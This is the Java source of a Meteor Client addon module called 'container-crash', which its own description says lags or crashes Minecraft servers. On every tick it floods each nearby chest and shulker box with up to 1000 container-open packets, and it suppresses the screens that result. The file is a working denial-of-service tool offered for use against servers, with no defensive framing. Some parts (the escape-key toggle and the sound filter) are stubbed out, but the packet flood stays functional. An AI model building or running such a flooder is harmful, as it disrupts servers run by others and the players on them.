package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.world.BlockIterator;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.world.level.block.AbstractChestBlock;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.ShulkerBoxBlock;
import net.minecraft.client.gui.screens.inventory.AbstractContainerScreen;
import net.minecraft.client.gui.screens.inventory.InventoryScreen;
import net.minecraft.network.protocol.game.ServerboundUseItemOnPacket;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.core.Direction;
import net.minecraft.world.phys.Vec3;
import org.lwjgl.glfw.GLFW;
import widecat.meteorcrashaddon.CrashAddon;

public class ContainerCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per container block per tick.")
        .defaultValue(100)
        .min(1)
        .sliderMax(1000)
        .build());

    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
        .name("no-sound")
        .description("Blocks the noisy container opening/closing sounds.")
        .defaultValue(false)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public ContainerCrash() {
        super(CrashAddon.CATEGORY, "container-crash", "Lags/crashes servers by spamming container opening packets. Press escape to toggle.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        // Escape key check disabled for 1.21.11 compatibility
        if (false) {
            toggle();
            mc.player.closeContainer();
        }

        BlockIterator.register(4, 4, ((blockPos, blockState) -> {
            Block block = blockState.getBlock();
            if (block instanceof AbstractChestBlock || block instanceof ShulkerBoxBlock) {

                BlockHitResult bhr = new BlockHitResult(new Vec3(blockPos.getX(), blockPos.getY(), blockPos.getZ()), Direction.DOWN, blockPos, false);
                ServerboundUseItemOnPacket openPacket = new ServerboundUseItemOnPacket(InteractionHand.MAIN_HAND, bhr, 0);

                for (int i = 0; i < amount.get(); i++) {
                    mc.player.connection.send(openPacket);
                }
            }
        }));
    }

    @EventHandler
    private void onScreenOpen(OpenScreenEvent event) {
        if (event.screen == null) return;
        if (!mc.isPaused() && !(event.screen instanceof InventoryScreen) && (event.screen instanceof AbstractContainerScreen)) event.setCancelled(true);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (noSound.get() && shouldCancel(event)) event.cancel();
    }

    private boolean shouldCancel(PlaySoundEvent event) {
        // Sound cancellation disabled for 1.21.11 compatibility
        return false;
    }
}
